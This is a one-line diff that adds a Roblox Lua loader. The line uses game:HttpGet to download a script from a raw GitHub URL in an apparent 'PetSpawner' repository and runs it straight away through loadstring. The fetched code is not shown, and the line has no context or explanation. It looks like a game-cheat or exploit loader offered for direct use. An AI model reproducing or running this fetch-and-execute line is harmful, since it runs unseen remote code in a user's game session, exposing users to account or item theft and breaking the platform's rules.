@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/petsSpawner01/PetSpawner/refs/heads/main/6bdc96f80c81da4faa4d7b588b8db338.txt"))()
